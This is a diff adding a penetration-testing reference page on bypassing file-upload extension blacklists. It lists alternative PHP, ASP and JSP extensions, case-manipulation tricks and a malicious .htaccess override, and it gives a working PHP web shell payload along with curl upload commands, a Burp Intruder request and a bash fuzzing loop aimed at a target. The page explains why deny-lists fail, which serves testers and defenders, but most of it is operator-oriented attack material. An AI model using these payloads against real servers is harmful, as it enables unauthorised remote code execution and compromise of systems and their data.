@@ -1,0 +1,295 @@
+---
+title: Extension blacklist
+description: Bypassing deny-list extension filters - uncommon executable extensions, case manipulation, and identifying which extensions actually execute on the target.
+mitre: [T1190, T1027]
+d3fend: [D3-FA]
+impact: [RCE, ServerSideEval]
+owasp: [A03]
+sidebar:
+  order: 4
+  label: Extension blacklist
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Blacklists try to stop dangerous extensions by listing them. They miss things. The classics that frequently get past a `.php`-only blacklist:
+
+```
+shell.phtml       # PHP-handler enabled for .phtml on most Apache configs
+shell.phar        # PHP archive - executes as PHP, often not blocked
+shell.php5        # version-specific PHP
+shell.php7
+shell.php3        # ancient but sometimes enabled
+shell.pht         # less common, sometimes works
+shell.pHp         # case manipulation (Windows or case-insensitive matchers)
+shell.PhP3
+```
+
+Success indicator: file uploads with the alternate extension, visiting it executes the code.
+
+## Why blacklists fail
+
+The fundamental problem: there are more dangerous extensions than the developer thought. PHP alone executes via at least seven extension variants depending on server configuration. A blacklist that catches `.php` and `.php5` misses `.phar`, `.phtml`, `.pht`. A blacklist that catches all those misses case-manipulated variants on Windows.
+
+A typical vulnerable blacklist:
+
+```php
+$blacklist = array('php', 'php3', 'php4', 'php5', 'phps');
+$extension = pathinfo($fileName, PATHINFO_EXTENSION);
+
+if (in_array($extension, $blacklist)) {
+    echo "File type not allowed";
+    die();
+}
+```
+
+This catches the obvious cases and misses `.phar`, `.phtml`, `.pht`, and case-manipulated variants like `.pHp`. The bypass is finding what's missing.
+
+## PHP - alternate executable extensions
+
+The complete list of PHP-executing extensions on a default Apache configuration:
+
+```
+.php          # primary
+.php2
+.php3
+.php4
+.php5
+.php6
+.php7
+.phps         # PHP source - often disabled but worth trying
+.pht
+.phtm
+.phtml
+.phar
+.phpt
+.pgif
+.shtml
+.htaccess     # not PHP itself, but lets you redefine handlers - see notes
+```
+
+The Apache configuration that enables these typically looks like:
+
+```apache
+<FilesMatch ".+\.ph(p[3457]?|t|tml|ar)">
+    SetHandler application/x-httpd-php
+</FilesMatch>
+```
+
+The regex above is what makes `.phar`, `.phtml`, `.pht`, `.phtm`, `.php3`, `.php4`, `.php5`, `.php7` all execute as PHP. If the regex is more permissive (`.+\.ph.+`), even more variants execute.
+
+### .phar - the most underrated
+
+`.phar` (PHP Archive) is enabled by default on most LAMP stacks. It's a legitimate PHP extension for executable archives - but the file doesn't have to be a real PHAR. A plain text file with `.phar` extension and PHP content executes as PHP:
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.phar
+# Upload as shell.phar
+# Visit https://target/uploads/shell.phar?cmd=id
+```
+
+Filter authors frequently miss `.phar` because it's less commonly known than `.php`. It's the operator's reliable fallback when `.php`, `.phtml`, and `.php5` are all blocked.
+
+### .phtml - the runner-up
+
+Same story - enabled on most Apache configs, less commonly blacklisted than `.php`. Try after `.phar`.
+
+### .htaccess - second-order
+
+`.htaccess` is an Apache configuration file. If the upload directory allows `.htaccess` and Apache reads it (`AllowOverride All` is set), uploading a malicious `.htaccess` redefines what counts as PHP:
+
+```apache
+# Upload this as .htaccess
+AddType application/x-httpd-php .jpg
+```
+
+Now any `.jpg` in the same directory executes as PHP. Upload `.htaccess` first, then upload `shell.jpg`. Many file-upload blacklists don't include `.htaccess` because it isn't an "executable" itself - but the second-order effect is just as serious.
+
+This works only if:
+- The upload landing directory allows per-directory `.htaccess`
+- The Apache config has `AllowOverride All` (or at least `AllowOverride FileInfo`)
+- The web server is Apache (Nginx ignores `.htaccess`)
+
+## ASP / ASP.NET - alternate extensions
+
+```
+.asp          # classic ASP
+.aspx         # ASP.NET
+.ashx         # HTTP handler
+.asmx         # web service
+.cer          # certificate file - sometimes executable on misconfigured IIS
+.cdx          # ChannelDefinitionFormat - sometimes executable
+.config       # IIS reads this and may execute embedded handler code
+.asax         # global.asax
+```
+
+`.ashx` is the ASP equivalent of `.phar` - frequently allowed, executes server-side code. The IIS handler regex usually catches it.
+
+## JSP - alternate extensions
+
+```
+.jsp
+.jspx
+.jspf
+.jsw
+.jsv
+.jhtml
+.tag          # tag library file - sometimes executable
+.tagx
+```
+
+`.jspx` is the most commonly-overlooked JSP variant.
+
+## Case manipulation
+
+On case-insensitive systems (Windows, some Linux + filesystem configurations), `shell.pHp` is the same file as `shell.php`. The blacklist's `in_array(['php', 'php3', ...])` does a case-sensitive match - `pHp` isn't in the list, passes through, gets written as `pHp`, then Apache treats it as PHP based on a case-insensitive match.
+
+```
+shell.pHp
+shell.PHp
+shell.PHP3
+shell.Phtml
+shell.PHAR
+```
+
+Pure-Linux servers may or may not be case-sensitive depending on filesystem (ext4 is, NTFS isn't). Case manipulation is most effective against:
+
+- Windows IIS targets
+- Apache on case-insensitive filesystems
+- PHP applications running on Windows
+- Macs (less common as production servers, but Docker-on-Mac is a thing)
+
+Try it as a quick variant when the lowercase forms fail. Costs nothing.
+
+## Identifying which extensions execute
+
+The blacklist might allow `.phar` but the server might not have `.phar` mapped to PHP. Test before committing:
+
+```bash
+# Upload a simple test file
+echo '<?php echo "PHAR_EXEC_OK"; ?>' > test.phar
+curl -F "uploadFile=@test.phar" https://target/upload.php
+
+# Visit it
+curl https://target/uploads/test.phar
+```
+
+Two outcomes:
+
+- Response contains `PHAR_EXEC_OK` → the extension executes as PHP, you have RCE
+- Response shows the raw `<?php echo ...; ?>` source → uploaded, but doesn't execute, try another extension
+- Response is 403 / 404 → upload failed or path wrong, see [Post-upload](/codex/web/uploads/post-upload/)
+
+Repeat with each candidate extension. Five minutes of testing maps which extensions actually work on the target.
+
+## Wordlists for fuzzing
+
+When manual variants don't work, fuzz a wordlist:
+
+```bash
+# PayloadsAllTheThings PHP extensions
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst
+
+# ASP variants
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP
+
+# General web extensions
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
+```
+
+Burp Intruder with the wordlist as a payload list, targeting the extension portion of the filename:
+
+```http
+POST /upload.php HTTP/1.1
+Host: target.example.com
+Content-Type: multipart/form-data; boundary=---X
+
+-----X
+Content-Disposition: form-data; name="uploadFile"; filename="shell.§ext§"
+Content-Type: image/png
+
+<?php system($_GET["cmd"]); ?>
+-----X--
+```
+
+Set the `§ext§` marker to fuzz on extensions from the wordlist. Sort results by response size - different sizes likely indicate different outcomes (success vs. rejection).
+
+## Diagnostic flow
+
+When you have a confirmed blacklist (you see "Extension not allowed" or similar):
+
+```bash
+# 1. Verify your basic attempt is being blocked
+curl -F "uploadFile=@test.php" https://target/upload.php
+# → "Extension not allowed"
+
+# 2. Try the operator's first five
+for ext in phtml phar php5 pHp pht; do
+    cp test.php test.$ext
+    response=$(curl -F "uploadFile=@test.$ext" https://target/upload.php)
+    echo "$ext: $response"
+    rm test.$ext
+done
+
+# 3. If none work, run a wordlist fuzz
+# 4. If still nothing, move to whitelist bypass - see Extension whitelist
+```
+
+## When the blacklist is robust
+
+A well-maintained blacklist might genuinely block every PHP-executing extension. When that's the case:
+
+- **Try a whitelist bypass** - even apps with a blacklist usually also have a whitelist. The whitelist's `.jpg`/`.png` accept list might be bypassable through [whitelist bypass techniques](/codex/web/uploads/extension-whitelist/).
+- **Try [LFI chain](/codex/web/lfi/file-upload-chain/)** - if the application has both LFI and uploads, upload any file with PHP content (regardless of extension) and include it via the LFI.
+- **Look for second-order injection** - if uploaded filenames get reflected anywhere (database, audit logs, file listings), the filename itself might be a vector.
+
+The blacklist is just one layer. When it's strong, other layers usually aren't.
+
+## Special case - uppercase regex match
+
+A blacklist sometimes uses regex case-insensitively:
+
+```php
+if (preg_match('/\.(php|phps|phtml)$/i', $fileName)) { ... }
+```
+
+The `/i` makes the match case-insensitive - `.pHp` and `.PHP` both match. Case manipulation alone won't help here.
+
+The bypass: extensions outside the regex's enumeration. `.phar`, `.pht`, `.php5` - if the regex doesn't explicitly list them, they pass even with case-insensitivity.
+
+## Cross-language case - application stack guesswork
+
+Sometimes the application is multi-language (PHP frontend, Python backend, etc.). The blacklist might cover PHP but miss other executables:
+
+```
+.py        # if Python CGI is enabled
+.pl        # Perl CGI
+.cgi       # generic CGI
+.rb        # Ruby CGI (rare)
+.jar       # if a Java servlet container processes uploaded JARs
+.war       # Java web archive (Tomcat)
+```
+
+These are less likely to execute than PHP variants but worth trying on targets that look mixed-stack.
+
+## Detection-only payloads
+
+A confirmation that the extension executes, without committing to a real shell:
+
+```php
+<?php echo md5("PHARPROBE_" . date("YmdHi")); ?>
+```
+
+The output is a unique 32-char hex string per minute - distinguishable from any normal page content, hard to false-positive on. Replace `phar` in `PHARPROBE` to identify which extension was the success vector when testing multiple.
+
+## Notes
+
+- **`.phar` is the operator's reliable fallback.** Frequently allowed because filter authors didn't recognize it; frequently executable because Apache's default PHP handler regex includes it. Try `.phar` after `.php` fails before trying anything else.
+- **Case manipulation is free to try.** Even when the server doesn't appear Windows-flavored, the filesystem might be case-insensitive. Costs one extra request.
+- **`.htaccess` is high-yield when it works.** Per-directory `.htaccess` enabled in upload directories is a common misconfiguration - uploading `.htaccess` to redefine handlers can re-enable execution of allowed extensions.
+- **Some blacklists also check the file content.** A blacklist that catches both the extension and the `<?php` opening tag in the file content needs a [content-type bypass](/codex/web/uploads/content-type-bypass/) in addition to an extension variant.
+
+<Aside type="tip">
+The first five extensions to try when `.php` is blocked: `.phar`, `.phtml`, `.pht`, `.php5`, `.pHp`. One of these typically works on real-world blacklisted PHP applications. Test with a minimal payload (`<?php echo "OK"; ?>`) before deploying a real shell.
+</Aside>
